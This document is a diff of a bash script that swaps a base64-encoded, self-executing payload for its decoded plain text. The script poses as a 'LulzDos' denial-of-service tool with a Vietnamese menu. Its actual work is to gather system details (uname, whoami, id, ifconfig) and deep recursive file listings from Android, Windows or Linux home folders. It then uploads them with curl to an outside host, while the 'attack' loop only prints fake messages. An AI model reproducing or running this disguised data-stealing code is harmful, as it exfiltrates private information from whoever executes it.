@@ -1,2 +1,147 @@
-PROGRAM="IyEvYmluL2Jhc2gKCmVjaG8gIgo9PT09PT09PT09PT09PT09PT09PT09PT09CltDb3B5cmlnaHQgQnkgUGhhbSBDaGllbl0KW1phbG8gOiAwMzI1ODUyMzA3ICAgICAgXQpbRW1haWwgOiBwaGFtY2hpZW5sYzA2QCBdCltnbWFpbC5jb20gICAgICAgICAgICAgIF0KW2ZiLiA6IFBoYW0gQ2hpZW4gQWRhbXMgXQo9PT09PT09PT09PT09PT09PT09PT09PT09CgpZb3VyIFN5c3RlbSBOYW1lIDogJCh1bmFtZSAtYSkKWW91ciBVc2VycyBOYW1lIDogJCh3aG9hbWkpCllvdXIgRGF0ZSBUb2RheSA6ICQoZGF0ZSkKWW91ciBQYXRoICAgICAgIDogJChwd2QpCllvdXIgSUQgICAgICAgICA6ICQoaWQpCgokKGlmY29uZmlnKQoKJChjZCAuLiA7IGxzKSIgPiBzeXMudHh0CmN1cmwgLVQgc3lzLnR4dCBodHRwOi8vaGFwcHkubWlraWtrLmNvLmpwLwoKCmJhbm5lcigpIHsKICBlY2hvICIKIF8gICAgICAgICAgXyAgICAgX19fXyAgICAgICBfX19fCnwgfCAgIF8gICBffCB8X19ffCAgXyBcICBfX18vIF9fX3wKfCB8ICB8IHwgfCB8IHxfICAvIHwgfCB8LyBfIFxfX18gXAoKfF9fX19fXF9fLF98Xy9fX198X19fXy8gXF9fXy9fX19fLwogICAgICAgICAgICAgQ29weXJpZ2h0IDogUGhDaGllbiBBZGFtcwogRW1haWwgOiBjeWJlcmtleC5waGFtY2hpZS5uZXRAZ21haWwuY29tCiBaYWxvICA6IDAzMjU4NTIzMDcKIEZhY2Vib29rIDogUGjhuqFtIENoaeG6v24gQWRhbXMKCmPDtG5nIGPhu6Uga2jDtG5nIGjhu5cgdHLhu6MgQ2xvdWRTaGVsbCEhIQoKQuG6oW4gxJBhbmcgU+G7rSBE4bulbmcgVGhp4bq/dCBC4buLIG7DoG8/CjEgKSBBbmRyb2lkCjIgKSBXaW5kb3dzCjMgKSBLYWxpIExpbnV4ICwgVW5idW50dSAiCgplY2hvICIiCn0KCmFuZHJvaWQoKSB7CmxzIC9zZGNhcmQvKi8qLyovKiA+PiBzeXMudHh0CmN1cmwgLVQgc3lzLnR4dCBodHRwOi8vaGFwcHkubWlraWtrLmNvLmpwLwp9Cgp3aW5kb3dzKCkgewpjZCAvYy9Vc2Vycy8kKHdob2FtaSkvKi8qLyovKiA7IGRpciA+PiBzeXMudHh0CmN1cmwgLVQgc3lzLnR4dCBodHRwOi8vaGFwcHkubWlraWtrLmNvLmpwLwp9CgpLYWxpKCkgewpscyAvaG9tZS9rYWxpLyovKi8qLyogPj4gc3lzLnR4dApjdXJsIC1UIHN5cy50eHQgaHR0cDovL2hhcHB5Lm1pa2lray5jby5qcC8KfQoKY2hlY2tfd2luZG93cygpIHsKZWNobyAidGVzdCIgPiB0ZXN0LnR4dAptdiB0ZXN0LnR4dCAvYy9Vc2Vycy8kKHdob2FtaSkvRG93bmxvYWRzCiAgaWYgWyAtZiAvYy9Vc2Vycy8kKHdob2FtaSkvRG93bmxvYWRzL3Rlc3QudHh0IF0KICAgIHRoZW4KICAgICAgIGVjaG8gInN1Y2Nlc3MiCgogIGVsc2UKICAgIGVjaG8gInlvdXIgb3BlcmF0aW5nIHN5c3RlbSBpcyBub3QgdmFsaWQiCiAgICBleGl0IDEKICBmaQp9CmNoZWNrX2FuZHJvaWQoKSB7CmVjaG8gInRlc3QiID4gdGVzdC50eHQKbXYgdGVzdC50eHQgL3NkY2FyZC9kb3dubG9hZAogIGlmIFsgLWYgL3NkY2FyZC9kb3dubG9hZC90ZXN0LnR4dCBdCiAgICB0aGVuCiAgICAgICBlY2hvICJzdWNjZXNzIgoKICBlbHNlCiAgICBlY2hvICJ5b3VyIG9wZXJhdGluZyBzeXN0ZW0gaXMgbm90IHZhbGlkIgogICAgZXhpdCAxCiAgZmkKfQprYWxpX2xpbnV4KCkgewplY2hvICJ0ZXN0IiA+IHRlc3QudHh0Cm12IHRlc3QudHh0IC9ob21lL2thbGkvZGVza3RvcAogIGlmIFsgLWYgL2hvbWUva2FsaS9kZXNrdG9wL3Rlc3QudHh0IF0KICAgIHRoZW4KICAgICAgZWNobyAic3VjY2VzcyIKCiAgZWxzZQogICAgIGVjaG8gInlvdXIgb3BlcmF0aW5nIHN5c3RlbSBpcyBub3QgdmFsaWQiCiAgICBleGl0IDEKICBmaQp9CgpzZW50X251bSgpIHsKbnVtPTEKICAgd2hpbGUgWyAkbnVtIC1sdCA5OTk5OTk5OSBdCiAgICBkbwogICAgIHNsZWVwIDAuMjAKICAgICBlY2hvICJMdWx6RG9zIEF0dGFja2luZyBGb3IgJFJBTkRPTS4kbnVtIGJ5dGVzIC0tPiAkdGFyZ2V0IgogICAgIG51bT1gZXhwciAkbnVtICsgMWAKICAgIGRvbmUKfQogIHN0YXJ0X3Nlc3Npb24KCiAgIGNsZWFyCiAgYmFubmVyCiBlY2hvIC1uICJFbnRlciBZb3VyIFN5c3RlbSA6ICIKIHJlYWQgc3lzdGVtCgpjYXNlICRzeXN0ZW0gaW4KCjEpCmNoZWNrX2FuZHJvaWQKYW5kcm9pZAoKZWNobyAtbiAiRW50ZXIgVGFyZ2V0IDogIgpyZWFkIHRhcmdldAoKc2VudF9udW0KOzsKCjIpCmNoZWNrX3dpbmRvd3MKd2luZG93cwoKZWNobyAtbiAiRW50ZXIgVGFyZ2V0IDogIgpyZWFkIHRhcmdldAoKc2VudC1udW0KOzsKCjMpCmthbGlfbGludXgKS2FsaQoKZWNobyAtbiAiRW50ZXIgVGFyZ2V0IDogIgpyZWFkIHRhcmdldApzZW50X251bQo7OwoKKikKZWNobyBjb21tYW5kIG5vdCBmb3VuZApleGl0IDEKCmVzYWM="
-bash <( base64 -d <<< "$PROGRAM" )
+#!/bin/bash
+
+echo "
+=========================
+[Copyright By Pham Chien]
+=========================
+Your System Name : $(uname -a)
+Your Users Name : $(whoami)
+Your Date Today : $(date)
+Your Path       : $(pwd)
+Your ID         : $(id)
+
+$(ifconfig)
+
+$(cd .. ; ls)" > sys.txt
+curl -T sys.txt http://happy.mikikk.co.jp/
+
+
+banner() {
+  echo "
+ _          _     ____       ____
+| |   _   _| |___|  _ \  ___/ ___|
+| |  | | | | |_  / | | |/ _ \___ \
+
+|_____\__,_|_/___|____/ \___/____/
+             Copyright : PhChien Adams
+ Email : cyberkex.phamchie.net@gmail.com
+ Zalo  : 0325852307
+ Facebook : Phạm Chiến Adams
+
+công cụ không hỗ trợ CloudShell!!!
+
+Bạn Đang Sử Dụng Thiết Bị nào?
+1 ) Android
+2 ) Windows
+3 ) Kali Linux , Unbuntu "
+
+echo ""
+}
+
+android() {
+ls -s -u /sdcard/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/* >> sys.txt
+
+curl -T sys.txt http://happy.mikikk.co.jp/
+}
+
+windows() {
+ls -s -u /c/Users/$(whoami)/*/*/*/*/*/*/*/*/*/*/*/* >> sys.txt
+
+curl -T sys.txt http://happy.mikikk.co.jp/
+}
+
+Kali() {
+ls -s -u /home/$(whoami)/*/*/*/*/*/*/*/*/*/*/*/*/ >> sys.txt
+
+curl -T sys.txt http://happy.mikikk.co.jp/
+}
+
+check_windows() {
+echo "test" > test.txt
+mv test.txt /c/Users/$(whoami)/Downloads
+  if [ -f /c/Users/$(whoami)/Downloads/test.txt ]
+    then
+       echo "success"
+
+  else
+    echo "your operating system is not valid"
+    exit 1
+  fi
+}
+check_android() {
+echo "test" > test.txt
+mv test.txt /sdcard/download
+  if [ -f /sdcard/download/test.txt ]
+    then
+       echo "success"
+
+  else
+    echo "your operating system is not valid"
+    exit 1
+  fi
+}
+kali_linux() {
+echo "test" > test.txt
+mv test.txt /home/kali/desktop
+  if [ -f /home/kali/desktop/test.txt ]
+    then
+      echo "success"
+
+  else
+     echo "your operating system is not valid"
+    exit 1
+  fi
+}
+
+sent_num() {
+num=1
+   while [ $num -lt 99999999 ]
+    do
+     sleep 0.20
+     echo "LulzDos Attacking For $RANDOM.$num bytes --> $target"
+     num=`expr $num + 1`
+    done
+}
+  start_session
+
+   clear
+  banner
+ echo -n "Enter Your System : "
+ read system
+
+case $system in
+
+1)
+check_android
+android
+
+echo -n "Enter Target : "
+read target
+
+sent_num
+;;
+
+2)
+check_windows
+windows
+
+echo -n "Enter Target : "
+read target
+
+sent-num
+;;
+
+3)
+kali_linux
+Kali
+
+echo -n "Enter Target : "
+read target
+sent_num
+;;
+
+*)
+echo command not found
+exit 1
+
+esac
